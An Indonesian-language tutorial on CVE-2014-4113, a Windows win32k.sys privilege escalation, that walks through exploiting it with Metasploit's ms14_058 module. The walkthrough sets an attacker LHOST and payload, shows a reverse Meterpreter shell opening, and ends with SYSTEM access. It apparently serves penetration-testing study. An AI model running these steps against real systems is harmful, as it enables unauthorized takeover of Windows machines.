# CVE-2014-4113

## A. Apa itu CVE-2014-4113?

[CVE-2014-4113](https://nvd.nist.gov/vuln/detail/CVE-2014-4113) adalah kerentanan Local Privilege Escalation (LPE) pada sistem operasi Windows yang ditemukan di `Win32k.sys`, sebuah driver kernel-mode dari subsistem grafik Windows.

Kerentanan ini memungkinkan penyerang dengan hak akses terbatas (user biasa) untuk mengeksekusi kode arbitrer dalam mode kernel, dan mendapatkan hak akses tertinggi (`NT AUTHORITY\SYSTEM`).

## B. Detail Teknis
- CVE ID: `CVE-2014-4113`  
- Tanggal Rilis: `14 Oktober 2014`  
- Tipe: Local Privilege Escalation (LPE)  
- Fungsi Rentan: Manipulasi objek GUI (`tagWND`)  
- Komponen: `win32k.sys`  
- Platform: `Windows XP` hingga `Windows 8.1` / `Windows Server 2003` hingga `2012 R2`  
- Arsitektur: `x86` dan `x64`  
- Skor CVSS: `8.3` (Tinggi)
  
## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `CVE-2014-4113`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-058#affected-software](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-058#affected-software)
  
## D. Langkah Penggunaan di Metasploit

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Modul Exploit MS14-058:

   ```
   msf6 > use exploit/windows/local/ms14_058_track_popup_menu
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```
   
5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] win32k.sys file version: 6.1.7601.17514 branch: 17
   [*] Reflectively injecting the exploit DLL and triggering the exploit...
   [*] Launching msiexec to host the DLL...
   [+] Process 2960 launched.
   [*] Reflectively injecting the DLL into 2960...
   [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 18 opened (192.168.1.42:4444 -> 192.168.1.50:49177) at 2025-05-14 17:01:01 +0700

   meterpreter >
   ```

   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```

   > Keterangan: `NT AUTHORITY\SYSTEM` adalah akun tertinggi di sistem Windows itu setara dengan `root` pada sistem Linux.
